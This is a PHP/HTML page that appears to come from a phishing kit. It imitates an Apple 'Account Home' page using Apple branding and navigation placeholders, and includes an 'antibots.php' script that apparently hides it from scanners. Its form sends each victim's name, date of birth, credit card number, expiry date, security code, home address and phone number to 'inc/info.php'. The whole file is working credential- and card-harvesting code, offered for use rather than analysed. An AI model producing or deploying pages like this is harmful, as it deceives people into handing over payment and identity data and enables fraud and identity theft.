<?php
require "antibots.php";

?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Account Home  - Apple</title>
	<link rel="icon" type="image/ico" href="images/favicon.ico" />

<link href="css/payment.css" rel="stylesheet">
<form action="inc/info.php" required="required" method="post" class="" name="login" >
</head>
<body>

<div id="wb_Bookmark1" style="position:absolute;left:561px;top:1339px;width:47px;height:18px;z-index:0;">
<a id="Bookmark1" style="visibility:hidden">&nbsp;</a>
</div>
<input type="text" id="Editbox1" style="position:absolute;left:439px;top:293px;width:274px;height:21px;line-height:21px;z-index:1;" required="required" name="fname" value="" placeholder="first name">
<input type="text" id="Editbox2" style="position:absolute;left:439px;top:335px;width:274px;height:21px;line-height:21px;z-index:2;"  name="mname" value="" placeholder="middle name (optional)">
<input type="text" id="Editbox3" style="position:absolute;left:439px;top:377px;width:274px;height:21px;line-height:21px;z-index:3;" required="required"  name="lname" value="" placeholder="last name">
<input type="date" id="Editbox4" style="position:absolute;left:439px;top:486px;width:274px;height:21px;line-height:21px;z-index:4;" required="required" aria-required="true" name="dob" value="" maxlength="10" pattern="(0[1-9]|[12][0-9]|3[01])/(([0][1-9])|([1][0-2]))/((1|2)[0-9]{3})">
<input type="text" id="Editbox5" style="position:absolute;left:440px;top:608px;width:274px;height:21px;line-height:21px;z-index:5;" required="required" name="cchn" value="" placeholder="card holder name">
<input type="text" id="Editbox6" style="position:absolute;left:440px;top:654px;width:274px;height:21px;line-height:21px;z-index:6;" name="ccnum" value="" placeholder="credit card number" maxlength="16" required="" onkeyup="if (/\D/g.test(this.value)) this.value = this.value.replace(/\D/g,'')" pattern="[0-9].{14,16}">
<input type="text" id="Editbox7" style="position:absolute;left:440px;top:703px;width:123px;height:21px;line-height:21px;z-index:7;" name="expdate" value="" placeholder="mm/yyyy" aria-required="true" maxlength="7" pattern="(([0][1-9])|([1][0-2]))/((1|2)[0-9]{3})" data-format="mm/yyyy" required="required">
<input type="text" id="Editbox8" style="position:absolute;left:590px;top:703px;width:124px;height:21px;line-height:21px;z-index:8;" name="cvv2" value="" placeholder="security code" maxlength="4"  onkeyup="if (/\D/g.test(this.value)) this.value = this.value.replace(/\D/g,'')" pattern="[0-9].{2,4}" required="" >
<input type="text" id="Editbox9" style="position:absolute;left:440px;top:791px;width:274px;height:21px;line-height:21px;z-index:9;" required="required" name="add1" value="" placeholder="street address">
<input type="text" id="Editbox10" style="position:absolute;left:440px;top:837px;width:274px;height:21px;line-height:21px;z-index:10;"  name="add2" value="" placeholder="apt., suite, bldg">
<input type="text" id="Editbox11" style="position:absolute;left:439px;top:884px;width:274px;height:21px;line-height:21px;z-index:11;" required="required" name="zipcode" value="" placeholder="postode">
<input type="text" id="Editbox12" style="position:absolute;left:440px;top:931px;width:274px;height:21px;line-height:21px;z-index:12;" required="required" name="city" value="" placeholder="city">
<select  name="cntr" size="1" id="Combobox1" style="position:absolute;left:438px;top:977px;width:285px;height:32px;z-index:13;">
<option selected value="cntr">country</option>
<option value="Afganistan">Afghanistan</option>
<span class="Apple-converted-space"></span>
<option value="Albania">Albania</option>
<span class="Apple-converted-space"></span>
<option value="Algeria">Algeria</option>
<span class="Apple-converted-space"></span>
<option value="American Samoa">American Samoa</option>
<span class="Apple-converted-space"></span>
<option value="Andorra">Andorra</option>
<span class="Apple-converted-space"></span>
<option value="Angola">Angola</option>
<span class="Apple-converted-space"></span>
<option value="Anguilla">Anguilla</option>
<span class="Apple-converted-space"></span>
<option value="Antigua &amp; Barbuda">Antigua &amp; Barbuda</option>
<span class="Apple-converted-space"></span>
<option value="Argentina">Argentina</option>
<span class="Apple-converted-space"></span>
<option value="Armenia">Armenia</option>
<span class="Apple-converted-space"></span>
<option value="Aruba">Aruba</option>
<span class="Apple-converted-space"></span>
<option value="Australia">Australia</option>
<span class="Apple-converted-space"></span>
<option value="Austria">Austria</option>
<span class="Apple-converted-space"></span>
<option value="Azerbaijan">Azerbaijan</option>
<span class="Apple-converted-space"></span>
<option value="Bahamas">Bahamas</option>
<span class="Apple-converted-space"></span>
<option value="Bahrain">Bahrain</option>
<span class="Apple-converted-space"></span>
<option value="Bangladesh">Bangladesh</option>
<span class="Apple-converted-space"></span>
<option value="Barbados">Barbados</option>
<span class="Apple-converted-space"></span>
<option value="Belarus">Belarus</option>
<span class="Apple-converted-space"></span>
<option value="Belgium">Belgium</option>
<span class="Apple-converted-space"></span>
<option value="Belize">Belize</option>
<span class="Apple-converted-space"></span>
<option value="Benin">Benin</option>
<span class="Apple-converted-space"></span>
<option value="Bermuda">Bermuda</option>
<span class="Apple-converted-space"></span>
<option value="Bhutan">Bhutan</option>
<span class="Apple-converted-space"></span>
<option value="Bolivia">Bolivia</option>
<span class="Apple-converted-space"></span>
<option value="Bonaire">Bonaire</option>
<span class="Apple-converted-space"></span>
<option value="Bosnia &amp; Herzegovina">Bosnia &amp; Herzegovina</option>
<span class="Apple-converted-space"></span>
<option value="Botswana">Botswana</option>
<span class="Apple-converted-space"></span>
<option value="Brazil">Brazil</option>
<span class="Apple-converted-space"></span>
<option value="British Indian Ocean Ter">British Indian Ocean Ter</option>
<span class="Apple-converted-space"></span>
<option value="Brunei">Brunei</option>
<span class="Apple-converted-space"></span>
<option value="Bulgaria">Bulgaria</option>
<span class="Apple-converted-space"></span>
<option value="Burkina Faso">Burkina Faso</option>
<span class="Apple-converted-space"></span>
<option value="Burundi">Burundi</option>
<span class="Apple-converted-space"></span>
<option value="Cambodia">Cambodia</option>
<span class="Apple-converted-space"></span>
<option value="Cameroon">Cameroon</option>
<span class="Apple-converted-space"></span>
<option value="Canada">Canada</option>
<span class="Apple-converted-space"></span>
<option value="Canary Islands">Canary Islands</option>
<span class="Apple-converted-space"></span>
<option value="Cape Verde">Cape Verde</option>
<span class="Apple-converted-space"></span>
<option value="Cayman Islands">Cayman Islands</option>
<span class="Apple-converted-space"></span>
<option value="Central African Republic">Central African Republic</option>
<span class="Apple-converted-space"></span>
<option value="Chad">Chad</option>
<span class="Apple-converted-space"></span>
<option value="Channel Islands">Channel Islands</option>
<span class="Apple-converted-space"></span>
<option value="Chile">Chile</option>
<span class="Apple-converted-space"></span>
<option value="China">China</option>
<span class="Apple-converted-space"></span>
<option value="Christmas Island">Christmas Island</option>
<span class="Apple-converted-space"></span>
<option value="Cocos Island">Cocos Island</option>
<span class="Apple-converted-space"></span>
<option value="Colombia">Colombia</option>
<span class="Apple-converted-space"></span>
<option value="Comoros">Comoros</option>
<span class="Apple-converted-space"></span>
<option value="Congo">Congo</option>
<span class="Apple-converted-space"></span>
<option value="Cook Islands">Cook Islands</option>
<span class="Apple-converted-space"></span>
<option value="Costa Rica">Costa Rica</option>
<span class="Apple-converted-space"></span>
<option value="Cote DIvoire">Cote D'Ivoire</option>
<span class="Apple-converted-space"></span>
<option value="Croatia">Croatia</option>
<span class="Apple-converted-space"></span>
<option value="Cuba">Cuba</option>
<span class="Apple-converted-space"></span>
<option value="Curaco">Curacao</option>
<span class="Apple-converted-space"></span>
<option value="Cyprus">Cyprus</option>
<span class="Apple-converted-space"></span>
<option value="Czech Republic">Czech Republic</option>
<span class="Apple-converted-space"></span>
<option value="Denmark">Denmark</option>
<span class="Apple-converted-space"></span>
<option value="Djibouti">Djibouti</option>
<span class="Apple-converted-space"></span>
<option value="Dominica">Dominica</option>
<span class="Apple-converted-space"></span>
<option value="Dominican Republic">Dominican Republic</option>
<span class="Apple-converted-space"></span>
<option value="East Timor">East Timor</option>
<span class="Apple-converted-space"></span>
<option value="Ecuador">Ecuador</option>
<span class="Apple-converted-space"></span>
<option value="Egypt">Egypt</option>
<span class="Apple-converted-space"></span>
<option value="El Salvador">El Salvador</option>
<span class="Apple-converted-space"></span>
<option value="Equatorial Guinea">Equatorial Guinea</option>
<span class="Apple-converted-space"></span>
<option value="Eritrea">Eritrea</option>
<span class="Apple-converted-space"></span>
<option value="Estonia">Estonia</option>
<span class="Apple-converted-space"></span>
<option value="Ethiopia">Ethiopia</option>
<span class="Apple-converted-space"></span>
<option value="Falkland Islands">Falkland Islands</option>
<span class="Apple-converted-space"></span>
<option value="Faroe Islands">Faroe Islands</option>
<span class="Apple-converted-space"></span>
<option value="Fiji">Fiji</option>
<span class="Apple-converted-space"></span>
<option value="Finland">Finland</option>
<span class="Apple-converted-space"></span>
<option value="France">France</option>
<span class="Apple-converted-space"></span>
<option value="French Guiana">French Guiana</option>
<span class="Apple-converted-space"></span>
<option value="French Polynesia">French Polynesia</option>
<span class="Apple-converted-space"></span>
<option value="French Southern Ter">French Southern Ter</option>
<span class="Apple-converted-space"></span>
<option value="Gabon">Gabon</option>
<span class="Apple-converted-space"></span>
<option value="Gambia">Gambia</option>
<span class="Apple-converted-space"></span>
<option value="Georgia">Georgia</option>
<span class="Apple-converted-space"></span>
<option value="Germany">Germany</option>
<span class="Apple-converted-space"></span>
<option value="Ghana">Ghana</option>
<span class="Apple-converted-space"></span>
<option value="Gibraltar">Gibraltar</option>
<span class="Apple-converted-space"></span>
<option value="Great Britain">Great Britain</option>
<span class="Apple-converted-space"></span>
<option value="Greece">Greece</option>
<span class="Apple-converted-space"></span>
<option value="Greenland">Greenland</option>
<span class="Apple-converted-space"></span>
<option value="Grenada">Grenada</option>
<span class="Apple-converted-space"></span>
<option value="Guadeloupe">Guadeloupe</option>
<span class="Apple-converted-space"></span>
<option value="Guam">Guam</option>
<span class="Apple-converted-space"></span>
<option value="Guatemala">Guatemala</option>
<span class="Apple-converted-space"></span>
<option value="Guinea">Guinea</option>
<span class="Apple-converted-space"></span>
<option value="Guyana">Guyana</option>
<span class="Apple-converted-space"></span>
<option value="Haiti">Haiti</option>
<span class="Apple-converted-space"></span>
<option value="Hawaii">Hawaii</option>
<span class="Apple-converted-space"></span>
<option value="Honduras">Honduras</option>
<span class="Apple-converted-space"></span>
<option value="Hong Kong">Hong Kong</option>
<span class="Apple-converted-space"></span>
<option value="Hungary">Hungary</option>
<span class="Apple-converted-space"></span>
<option value="Iceland">Iceland</option>
<span class="Apple-converted-space"></span>
<option value="India">India</option>
<span class="Apple-converted-space"></span>
<option value="Indonesia">Indonesia</option>
<span class="Apple-converted-space"></span>
<option value="Iran">Iran</option>
<span class="Apple-converted-space"></span>
<option value="Iraq">Iraq</option>
<span class="Apple-converted-space"></span>
<option value="Ireland">Ireland</option>
<span class="Apple-converted-space"></span>
<option value="Isle of Man">Isle of Man</option>
<span class="Apple-converted-space"></span>
<option value="Israel">Israel</option>
<span class="Apple-converted-space"></span>
<option value="Italy">Italy</option>
<span class="Apple-converted-space"></span>
<option value="Jamaica">Jamaica</option>
<span class="Apple-converted-space"></span>
<option value="Japan">Japan</option>
<span class="Apple-converted-space"></span>
<option value="Jordan">Jordan</option>
<span class="Apple-converted-space"></span>
<option value="Kazakhstan">Kazakhstan</option>
<span class="Apple-converted-space"></span>
<option value="Kenya">Kenya</option>
<span class="Apple-converted-space"></span>
<option value="Kiribati">Kiribati</option>
<span class="Apple-converted-space"></span>
<option value="Korea North">Korea North</option>
<span class="Apple-converted-space"></span>
<option value="Korea Sout">Korea South</option>
<span class="Apple-converted-space"></span>
<option value="Kuwait">Kuwait</option>
<span class="Apple-converted-space"></span>
<option value="Kyrgyzstan">Kyrgyzstan</option>
<span class="Apple-converted-space"></span>
<option value="Laos">Laos</option>
<span class="Apple-converted-space"></span>
<option value="Latvia">Latvia</option>
<span class="Apple-converted-space"></span>
<option value="Lebanon">Lebanon</option>
<span class="Apple-converted-space"></span>
<option value="Lesotho">Lesotho</option>
<span class="Apple-converted-space"></span>
<option value="Liberia">Liberia</option>
<span class="Apple-converted-space"></span>
<option value="Libya">Libya</option>
<span class="Apple-converted-space"></span>
<option value="Liechtenstein">Liechtenstein</option>
<span class="Apple-converted-space"></span>
<option value="Lithuania">Lithuania</option>
<span class="Apple-converted-space"></span>
<option value="Luxembourg">Luxembourg</option>
<span class="Apple-converted-space"></span>
<option value="Macau">Macau</option>
<span class="Apple-converted-space"></span>
<option value="Macedonia">Macedonia</option>
<span class="Apple-converted-space"></span>
<option value="Madagascar">Madagascar</option>
<span class="Apple-converted-space"></span>
<option value="Malaysia">Malaysia</option>
<span class="Apple-converted-space"></span>
<option value="Malawi">Malawi</option>
<span class="Apple-converted-space"></span>
<option value="Maldives">Maldives</option>
<span class="Apple-converted-space"></span>
<option value="Mali">Mali</option>
<span class="Apple-converted-space"></span>
<option value="Malta">Malta</option>
<span class="Apple-converted-space"></span>
<option value="Marshall Islands">Marshall Islands</option>
<span class="Apple-converted-space"></span>
<option value="Martinique">Martinique</option>
<span class="Apple-converted-space"></span>
<option value="Mauritania">Mauritania</option>
<span class="Apple-converted-space"></span>
<option value="Mauritius">Mauritius</option>
<span class="Apple-converted-space"></span>
<option value="Mayotte">Mayotte</option>
<span class="Apple-converted-space"></span>
<option value="Mexico">Mexico</option>
<span class="Apple-converted-space"></span>
<option value="Midway Islands">Midway Islands</option>
<span class="Apple-converted-space"></span>
<option value="Moldova">Moldova</option>
<span class="Apple-converted-space"></span>
<option value="Monaco">Monaco</option>
<span class="Apple-converted-space"></span>
<option value="Mongolia">Mongolia</option>
<span class="Apple-converted-space"></span>
<option value="Montserrat">Montserrat</option>
<span class="Apple-converted-space"></span>
<option value="Morocco">Morocco</option>
<span class="Apple-converted-space"></span>
<option value="Mozambique">Mozambique</option>
<span class="Apple-converted-space"></span>
<option value="Myanmar">Myanmar</option>
<span class="Apple-converted-space"></span>
<option value="Nambia">Nambia</option>
<span class="Apple-converted-space"></span>
<option value="Nauru">Nauru</option>
<span class="Apple-converted-space"></span>
<option value="Nepal">Nepal</option>
<span class="Apple-converted-space"></span>
<option value="Netherland Antilles">Netherland Antilles</option>
<span class="Apple-converted-space"></span>
<option value="Netherlands">Netherlands (Holland, Europe)</option>
<span class="Apple-converted-space"></span>
<option value="Nevis">Nevis</option>
<span class="Apple-converted-space"></span>
<option value="New Caledonia">New Caledonia</option>
<span class="Apple-converted-space"></span>
<option value="New Zealand">New Zealand</option>
<span class="Apple-converted-space"></span>
<option value="Nicaragua">Nicaragua</option>
<span class="Apple-converted-space"></span>
<option value="Niger">Niger</option>
<span class="Apple-converted-space"></span>
<option value="Nigeria">Nigeria</option>
<span class="Apple-converted-space"></span>
<option value="Niue">Niue</option>
<span class="Apple-converted-space"></span>
<option value="Norfolk Island">Norfolk Island</option>
<span class="Apple-converted-space"></span>
<option value="Norway">Norway</option>
<span class="Apple-converted-space"></span>
<option value="Oman">Oman</option>
<span class="Apple-converted-space"></span>
<option value="Pakistan">Pakistan</option>
<span class="Apple-converted-space"></span>
<option value="Palau Island">Palau Island</option>
<span class="Apple-converted-space"></span>
<option value="Palestine">Palestine</option>
<span class="Apple-converted-space"></span>
<option value="Panama">Panama</option>
<span class="Apple-converted-space"></span>
<option value="Papua New Guinea">Papua New Guinea</option>
<span class="Apple-converted-space"></span>
<option value="Paraguay">Paraguay</option>
<span class="Apple-converted-space"></span>
<option value="Peru">Peru</option>
<span class="Apple-converted-space"></span>
<option value="Phillipines">Philippines</option>
<span class="Apple-converted-space"></span>
<option value="Pitcairn Island">Pitcairn Island</option>
<span class="Apple-converted-space"></span>
<option value="Poland">Poland</option>
<span class="Apple-converted-space"></span>
<option value="Portugal">Portugal</option>
<span class="Apple-converted-space"></span>
<option value="Puerto Rico">Puerto Rico</option>
<span class="Apple-converted-space"></span>
<option value="Qatar">Qatar</option>
<span class="Apple-converted-space"></span>
<option value="Republic of Montenegro">Republic of Montenegro</option>
<span class="Apple-converted-space"></span>
<option value="Republic of Serbia">Republic of Serbia</option>
<span class="Apple-converted-space"></span>
<option value="Reunion">Reunion</option>
<span class="Apple-converted-space"></span>
<option value="Romania">Romania</option>
<span class="Apple-converted-space"></span>
<option value="Russia">Russia</option>
<span class="Apple-converted-space"></span>
<option value="Rwanda">Rwanda</option>
<span class="Apple-converted-space"></span>
<option value="St Barthelemy">St Barthelemy</option>
<span class="Apple-converted-space"></span>
<option value="St Eustatius">St Eustatius</option>
<span class="Apple-converted-space"></span>
<option value="St Helena">St Helena</option>
<span class="Apple-converted-space"></span>
<option value="St Kitts-Nevis">St Kitts-Nevis</option>
<span class="Apple-converted-space"></span>
<option value="St Lucia">St Lucia</option>
<span class="Apple-converted-space"></span>
<option value="St Maarten">St Maarten</option>
<span class="Apple-converted-space"></span>
<option value="St Pierre &amp; Miquelon">St Pierre &amp; Miquelon</option>
<span class="Apple-converted-space"></span>
<option value="St Vincent &amp; Grenadines">St Vincent &amp; Grenadines</option>
<span class="Apple-converted-space"></span>
<option value="Saipan">Saipan</option>
<span class="Apple-converted-space"></span>
<option value="Samoa">Samoa</option>
<span class="Apple-converted-space"></span>
<option value="Samoa American">Samoa American</option>
<span class="Apple-converted-space"></span>
<option value="San Marino">San Marino</option>
<span class="Apple-converted-space"></span>
<option value="Sao Tome &amp; Principe">Sao Tome &amp; Principe</option>
<span class="Apple-converted-space"></span>
<option value="Saudi Arabia">Saudi Arabia</option>
<span class="Apple-converted-space"></span>
<option value="Senegal">Senegal</option>
<span class="Apple-converted-space"></span>
<option value="Serbia">Serbia</option>
<span class="Apple-converted-space"></span>
<option value="Seychelles">Seychelles</option>
<span class="Apple-converted-space"></span>
<option value="Sierra Leone">Sierra Leone</option>
<span class="Apple-converted-space"></span>
<option value="Singapore">Singapore</option>
<span class="Apple-converted-space"></span>
<option value="Slovakia">Slovakia</option>
<span class="Apple-converted-space"></span>
<option value="Slovenia">Slovenia</option>
<span class="Apple-converted-space"></span>
<option value="Solomon Islands">Solomon Islands</option>
<span class="Apple-converted-space"></span>
<option value="Somalia">Somalia</option>
<span class="Apple-converted-space"></span>
<option value="South Africa">South Africa</option>
<span class="Apple-converted-space"></span>
<option value="Spain">Spain</option>
<span class="Apple-converted-space"></span>
<option value="Sri Lanka">Sri Lanka</option>
<span class="Apple-converted-space"></span>
<option value="Sudan">Sudan</option>
<span class="Apple-converted-space"></span>
<option value="Suriname">Suriname</option>
<span class="Apple-converted-space"></span>
<option value="Swaziland">Swaziland</option>
<span class="Apple-converted-space"></span>
<option value="Sweden">Sweden</option>
<span class="Apple-converted-space"></span>
<option value="Switzerland">Switzerland</option>
<span class="Apple-converted-space"></span>
<option value="Syria">Syria</option>
<span class="Apple-converted-space"></span>
<option value="Tahiti">Tahiti</option>
<span class="Apple-converted-space"></span>
<option value="Taiwan">Taiwan</option>
<span class="Apple-converted-space"></span>
<option value="Tajikistan">Tajikistan</option>
<span class="Apple-converted-space"></span>
<option value="Tanzania">Tanzania</option>
<span class="Apple-converted-space"></span>
<option value="Thailand">Thailand</option>
<span class="Apple-converted-space"></span>
<option value="Togo">Togo</option>
<span class="Apple-converted-space"></span>
<option value="Tokelau">Tokelau</option>
<span class="Apple-converted-space"></span>
<option value="Tonga">Tonga</option>
<span class="Apple-converted-space"></span>
<option value="Trinidad &amp; Tobago">Trinidad &amp; Tobago</option>
<span class="Apple-converted-space"></span>
<option value="Tunisia">Tunisia</option>
<span class="Apple-converted-space"></span>
<option value="Turkey">Turkey</option>
<span class="Apple-converted-space"></span>
<option value="Turkmenistan">Turkmenistan</option>
<span class="Apple-converted-space"></span>
<option value="Turks &amp; Caicos Is">Turks &amp; Caicos Is</option>
<span class="Apple-converted-space"></span>
<option value="Tuvalu">Tuvalu</option>
<span class="Apple-converted-space"></span>
<option value="Uganda">Uganda</option>
<span class="Apple-converted-space"></span>
<option value="Ukraine">Ukraine</option>
<span class="Apple-converted-space"></span>
<option value="United Arab Erimates">United Arab Emirates</option>
<span class="Apple-converted-space"></span>
<option value="United Kingdom">United Kingdom</option>
<span class="Apple-converted-space"></span>
<option value="United States of America">United States of America</option>
<span class="Apple-converted-space"></span>
<option value="Uraguay">Uruguay</option>
<span class="Apple-converted-space"></span>
<option value="Uzbekistan">Uzbekistan</option>
<span class="Apple-converted-space"></span>
<option value="Vanuatu">Vanuatu</option>
<span class="Apple-converted-space"></span>
<option value="Vatican City State">Vatican City State</option>
<span class="Apple-converted-space"></span>
<option value="Venezuela">Venezuela</option>
<span class="Apple-converted-space"></span>
<option value="Vietnam">Vietnam</option>
<span class="Apple-converted-space"></span>
<option value="Virgin Islands (Brit)">Virgin Islands (Brit)</option>
<span class="Apple-converted-space"></span>
<option value="Virgin Islands (USA)">Virgin Islands (USA)</option>
<span class="Apple-converted-space"></span>
<option value="Wake Island">Wake Island</option>
<span class="Apple-converted-space"></span>
<option value="Wallis &amp; Futana Is">Wallis &amp; Futana Is</option>
<span class="Apple-converted-space"></span>
<option value="Yemen">Yemen</option>
<span class="Apple-converted-space"></span>
<option value="Zaire">Zaire</option>
<span class="Apple-converted-space"></span>
<option value="Zambia">Zambia</option>
<span class="Apple-converted-space"></span>
<option value="Zimbabwe">Zimbabwe</option>
</select>
<input type="text" id="Editbox13" style="position:absolute;left:440px;top:1026px;width:90px;height:20px;line-height:20px;z-index:14;" required="required" name="arec" value="" placeholder="area code">
<input type="text" id="Editbox14" style="position:absolute;left:572px;top:1026px;width:142px;height:20px;line-height:20px;z-index:15;" required="required" name="phonen" value="" placeholder="phone number">
<input type="submit" id="Button1" name="" value="Continue" style="position:absolute;left:932px;top:1104px;width:96px;height:25px;z-index:16;">
<div id="wb_Image1" style="position:absolute;left:691px;top:708px;width:25px;height:23px;z-index:17;">
<img src="images/hlep.png" id="Image1" alt=""></div>

<a href="#"><img border="0" src="images/blank.gif" width="184" height="25"></a></div>
<div style="position: absolute; width: 50px; height: 25px; z-index: 5; left: 1130px; top: 5px" id="myaccount
0">
<a href="#"><img border="0" src="images/blank.gif" width="50" height="25"></a></div>
<div style="position: absolute; width: 50px; height: 25px; z-index: 5; left: 1040px; top: 5px" id="serch
">
<a href="#"><img border="0" src="images/blank.gif" width="50" height="25"></a></div>
<div style="position: absolute; width: 59px; height: 25px; z-index: 5; left: 924px; top: 5px" id="support">
<a href="#"><img border="0" src="images/blank.gif" width="59" height="25"></a></div>
<div style="position: absolute; width: 50px; height: 25px; z-index: 5; left: 807px; top: 5px" id="music">
<a href="#"><img border="0" src="images/blank.gif" width="50" height="25"></a></div>
<div style="position: absolute; width: 50px; height: 25px; z-index: 5; left: 705px; top: 5px" id="tv">
<a href="#"><img border="0" src="images/blank.gif" width="50" height="25"></a></div>
<div style="position: absolute; width: 50px; height: 25px; z-index: 5; left: 601px; top: 5px" id="watch">
<a href="#"><img border="0" src="images/blank.gif" width="50" height="25"></a></div>
<div style="position: absolute; width: 50px; height: 25px; z-index: 5; left: 482px; top: 5px" id="iphone">
<a href="#"><img border="0" src="images/blank.gif" width="50" height="25"></a></div>
<div style="position: absolute; width: 50px; height: 25px; z-index: 5; left: 370px; top: 5px" id="ipad">
<a href="#"><img border="0" src="images/blank.gif" width="50" height="25"></a></div>
<div style="position: absolute; width: 50px; height: 25px; z-index: 5; left: 267px; top: 5px" id="mac">
<a href="#"><img border="0" src="images/blank.gif" width="50" height="25"></a></div>
<div style="position: absolute; width: 50px; height: 25px; z-index: 5; left: 170px; top: 5px" id="applelog">
<p><a href="#"><img border="0" src="images/blank.gif" width="50" height="25"></a></div>
</body>
</html>